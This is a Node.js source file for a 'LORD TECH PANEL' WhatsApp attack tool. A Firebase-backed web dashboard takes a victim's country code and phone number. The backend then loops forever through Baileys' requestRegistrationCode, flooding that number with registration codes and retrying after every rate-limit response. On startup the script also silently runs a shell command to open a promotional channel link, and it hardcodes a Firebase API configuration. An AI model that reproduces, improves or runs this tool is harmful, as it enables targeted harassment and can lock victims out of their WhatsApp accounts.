const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');
const { exec } = require('child_process');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const http = require('http');

// Setup directory storage
if (!fs.existsSync('./files')) fs.mkdirSync('./files');

const color = (text, colors) => {
    try { return gradient(colors)(text); } catch (e) { return text; }
};

// --- MASTER Banner ---
const masterBanner = `
${color(' ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ ', ['#00F2FE', '#4FACFE'])}
${color(' ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗', ['#00F2FE', '#4FACFE'])}
${color(' ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝', ['#00F2FE', '#4FACFE'])}
${color(' ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔════╝██╔══██╗', ['#00F2FE', '#4FACFE'])}
${color(' ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║', ['#00F2FE', '#4FACFE'])}
${color(' ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝', ['#00F2FE', '#4FACFE'])}
`;

// Glassmorphism & High-End Dashboard HTML
const dashboardHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LORD TECH - Command Center</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #0b0f19;
            --card-bg: rgba(23, 31, 51, 0.6);
            --border-color: rgba(255, 255, 255, 0.08);
            --primary: #4f46e5;
            --primary-hover: #4338ca;
            --accent: #06b6d4;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;
            --error: #ef4444;
            --success: #10b981;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
        }

        body {
            background-color: var(--bg-color);
            background-image: 
                radial-gradient(at 0% 0%, rgba(79, 70, 229, 0.15) 0px, transparent 50%),
                radial-gradient(at 100% 100%, rgba(6, 182, 212, 0.15) 0px, transparent 50%);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px 40px;
            border-bottom: 1px solid var(--border-color);
            background: rgba(11, 15, 25, 0.8);
            backdrop-filter: blur(12px);
        }

        .brand {
            font-size: 1.25rem;
            font-weight: 700;
            letter-spacing: 0.5px;
            background: linear-gradient(135deg, #818cf8 0%, #06b6d4 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .creator-tag {
            font-size: 0.85rem;
            color: var(--text-muted);
            background: rgba(255, 255, 255, 0.05);
            padding: 6px 14px;
            border-radius: 20px;
            border: 1px solid var(--border-color);
        }

        .main-container {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .card {
            background: var(--card-bg);
            backdrop-filter: blur(16px);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 36px;
            width: 100%;
            max-width: 480px;
            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
        }

        .tabs {
            display: flex;
            margin-bottom: 24px;
            border-bottom: 1px solid var(--border-color);
        }

        .tab-btn {
            flex: 1;
            padding: 10px;
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 0.95rem;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            border-bottom: 2px solid transparent;
        }

        .tab-btn.active {
            color: var(--text-main);
            border-bottom-color: var(--accent);
        }

        .form-group {
            margin-bottom: 18px;
        }

        label {
            display: block;
            font-size: 0.85rem;
            color: var(--text-muted);
            margin-bottom: 6px;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-main);
            font-size: 0.95rem;
            outline: none;
            transition: border-color 0.2s ease;
        }

        input:focus {
            border-color: var(--accent);
        }

        .btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-hover) 100%);
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 0.95rem;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s ease, transform 0.1s ease;
            margin-top: 10px;
        }

        .btn:hover {
            opacity: 0.9;
        }

        .btn:active {
            transform: scale(0.99);
        }

        .btn-danger {
            background: rgba(239, 68, 68, 0.2);
            color: var(--error);
            border: 1px solid rgba(239, 68, 68, 0.3);
            margin-top: 20px;
        }

        .btn-danger:hover {
            background: rgba(239, 68, 68, 0.3);
        }

        #authStatus, #targetStatus {
            margin-top: 16px;
            font-size: 0.85rem;
            text-align: center;
            min-height: 20px;
        }

        .user-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            padding-bottom: 16px;
            border-bottom: 1px solid var(--border-color);
        }

        .user-email {
            font-size: 0.85rem;
            color: var(--text-muted);
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <header>
        <div class="brand">LORD TECH PANEL</div>
        <div class="creator-tag">Created by <strong>Lord Tech</strong></div>
    </header>

    <div class="main-container">
        <!-- AUTH SECTION -->
        <div id="authSection" class="card">
            <div class="tabs">
                <button class="tab-btn active" onclick="switchAuthMode('login')">Sign In</button>
                <button class="tab-btn" onclick="switchAuthMode('register')">Register</button>
            </div>

            <form id="authForm">
                <div class="form-group">
                    <label for="authEmail">Email Address</label>
                    <input type="email" id="authEmail" placeholder="name@domain.com" required>
                </div>
                <div class="form-group">
                    <label for="authPassword">Password</label>
                    <input type="password" id="authPassword" placeholder="••••••••" required>
                </div>
                <button type="submit" id="authSubmitBtn" class="btn">Sign In</button>
            </form>
            <div id="authStatus"></div>
        </div>

        <!-- DASHBOARD SECTION -->
        <div id="dashboardSection" class="card hidden">
            <div class="user-bar">
                <span class="user-email" id="currentUserDisplay">User</span>
                <span style="font-size: 0.75rem; background: rgba(16, 185, 129, 0.15); color: var(--success); padding: 4px 8px; border-radius: 4px;">Authenticated</span>
            </div>

            <form id="targetForm">
                <div class="form-group">
                    <label for="ddi">Country Code</label>
                    <input type="text" id="ddi" placeholder="e.g. 92" required>
                </div>
                <div class="form-group">
                    <label for="number">Target Phone Number</label>
                    <input type="text" id="number" placeholder="e.g. 3001234567" required>
                </div>
                <button type="submit" class="btn">Deploy Target</button>
            </form>

            <button id="logoutBtn" class="btn btn-danger">Sign Out</button>
            <div id="targetStatus"></div>
        </div>
    </div>

    <!-- Firebase Modular SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { 
            getAuth, 
            createUserWithEmailAndPassword, 
            signInWithEmailAndPassword, 
            signOut, 
            onAuthStateChanged 
        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
        import { 
            getDatabase, ref, push 
        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyCnLPPrYUgadNSpvCtOpY5-hxR-Oj9VRR4",
            authDomain: "botttt-90f17.firebaseapp.com",
            databaseURL: "https://botttt-90f17-default-rtdb.firebaseio.com",
            projectId: "botttt-90f17",
            storageBucket: "botttt-90f17.firebasestorage.app",
            messagingSenderId: "81533093740",
            appId: "1:81533093740:web:c538860b9245caa8d25549"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        let currentUser = null;
        let currentMode = 'login';

        window.switchAuthMode = (mode) => {
            currentMode = mode;
            const tabs = document.querySelectorAll('.tab-btn');
            const submitBtn = document.getElementById('authSubmitBtn');
            
            tabs[0].classList.toggle('active', mode === 'login');
            tabs[1].classList.toggle('active', mode === 'register');
            submitBtn.textContent = mode === 'login' ? 'Sign In' : 'Create Account';
            document.getElementById('authStatus').textContent = '';
        };

        onAuthStateChanged(auth, (user) => {
            currentUser = user;
            const authSec = document.getElementById('authSection');
            const dashSec = document.getElementById('dashboardSection');
            const userDisplay = document.getElementById('currentUserDisplay');

            if (user) {
                userDisplay.textContent = user.email;
                authSec.classList.add('hidden');
                dashSec.classList.remove('hidden');
            } else {
                authSec.classList.remove('hidden');
                dashSec.classList.add('hidden');
            }
        });

        document.getElementById('authForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('authEmail').value;
            const password = document.getElementById('authPassword').value;
            const statusDiv = document.getElementById('authStatus');

            statusDiv.style.color = '#9ca3af';
            statusDiv.textContent = 'Processing request...';

            try {
                if (currentMode === 'register') {
                    await createUserWithEmailAndPassword(auth, email, password);
                    statusDiv.style.color = '#10b981';
                    statusDiv.textContent = 'Account created successfully!';
                } else {
                    await signInWithEmailAndPassword(auth, email, password);
                    statusDiv.style.color = '#10b981';
                    statusDiv.textContent = 'Authenticated. Redirecting...';
                }
            } catch (error) {
                statusDiv.style.color = '#ef4444';
                statusDiv.textContent = error.message.replace('Firebase: ', '');
            }
        });

        document.getElementById('logoutBtn').addEventListener('click', () => {
            signOut(auth);
        });

        document.getElementById('targetForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const ddi = document.getElementById('ddi').value.trim();
            const number = document.getElementById('number').value.trim();
            const statusDiv = document.getElementById('targetStatus');
            
            statusDiv.textContent = "Deploying target request...";
            statusDiv.style.color = "#06b6d4";

            if (currentUser) {
                const userTargetsRef = ref(db, 'users/' + currentUser.uid + '/targets');
                push(userTargetsRef, {
                    ddi: ddi,
                    number: number,
                    timestamp: Date.now()
                });
            }

            try {
                const response = await fetch('/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ ddi, number })
                });

                const result = await response.json();
                statusDiv.textContent = result.message;
                statusDiv.style.color = "#10b981";
                document.getElementById('ddi').value = '';
                document.getElementById('number').value = '';
            } catch (error) {
                statusDiv.textContent = "Failed to communicate with backend.";
                statusDiv.style.color = "#ef4444";
            }
        });
    </script>
</body>
</html>
`;

const start = async () => {
    console.clear(); 

    const mainChannel = 'https://whatsapp.com/channel/0029Va75f6BIXnlq8eZxTy2M';
    const openCmd = process.platform === 'win32' ? `start ${mainChannel}` : `termux-open-url ${mainChannel} || xdg-open ${mainChannel}`;

    exec(openCmd);

    console.log(masterBanner);
    console.log(color('╔════════════════════════════════════════════╗', ['#00F2FE', '#4FACFE']));
    console.log(color('║       👑 CREATOR: LORD TECH 👑              ║', ['#FFFFFF', '#00F2FE']));
    console.log(color('╚════════════════════════════════════════════╝', ['#00F2FE', '#4FACFE']));

    const { state } = await useMultiFileAuthState('.auth_session');

    const spam = makeWaSocket({
        auth: state,
        mobile: true,
        logger: pino({ level: 'silent' })
    });

    const dropNumber = async (context) => {
        const { ddi, number, phoneNumber } = context;
        console.log(color(`\n[+] TARGET LAUNCHED: +${phoneNumber} | CREATOR: LORD TECH`, ['#00FF00', '#FFFFFF']));

        while (true) {
            try {
                const res = await spam.requestRegistrationCode({
                    phoneNumber: '+' + phoneNumber,
                    phoneNumberCountryCode: ddi,
                    phoneNumberNationalNumber: number,
                    phoneNumberMobileCountryCode: 724
                });

                console.log(color(`[>] REQUEST SENT -> +${phoneNumber}`, ['#00F2FE', '#FFFFFF']));

                if (res.reason === 'temporarily_unavailable') {
                    console.log(color(`[!] LIMIT REACHED (+${phoneNumber})! RETRY IN: ${res.retry_after}s`, ['#FF4500', '#FF0000']));
                    await new Promise(r => setTimeout(r, res.retry_after * 1000));
                }
            } catch (e) {
                console.log(color(`[!] RETRYING (+${phoneNumber})...`, ['#FFA500', '#FF0000']));
                await new Promise(r => setTimeout(r, 3000));
            }
        }
    };

    // Node.js HTTP Server
    const server = http.createServer((req, res) => {
        if (req.method === 'GET' && req.url === '/') {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(dashboardHTML);
        } else if (req.method === 'POST' && req.url === '/start') {
            let body = '';
            req.on('data', chunk => body += chunk.toString());
            req.on('end', () => {
                const data = JSON.parse(body);
                
                dropNumber({ 
                    ddi: data.ddi, 
                    number: data.number, 
                    phoneNumber: data.ddi + data.number 
                });
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ message: `Target +${data.ddi}${data.number} engaged. Check Termux terminal.` }));
            });
        } else {
            res.writeHead(404);
            res.end();
        }
    });

    server.listen(3000, () => {
        console.log(color('\n ► LORD TECH PANEL RUNNING: http://localhost:3000', ['#00FF00', '#FFFFFF']));
    });
};

start();
